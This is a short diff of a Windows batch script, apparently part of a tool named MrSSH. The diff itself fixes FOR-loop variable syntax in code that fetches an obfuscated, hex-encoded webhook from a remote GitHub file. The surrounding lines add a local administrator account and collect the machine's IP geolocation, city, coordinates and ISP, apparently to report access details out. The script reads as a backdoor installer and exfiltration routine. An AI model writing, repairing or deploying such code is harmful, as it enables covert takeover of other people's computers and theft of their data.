@@ -20,10 +20,10 @@ net localgroup Administración  Admin /add
 
 :: <Set webhook>
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
-FOR /F "delims=" %F IN (tokenName.txt) DO SET token=%F
-FOR /F "tokens=* USEBACKQ" %F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%F)
+FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
+FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
 set "hexwebhook=%hexwebhook:~-244%"
-FOR /F "tokens=* USEBACKQ" %F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%F)
+FOR /F "tokens=* USEBACKQ" %%F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%%F)
 :: </Set webhook>
 
 for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"
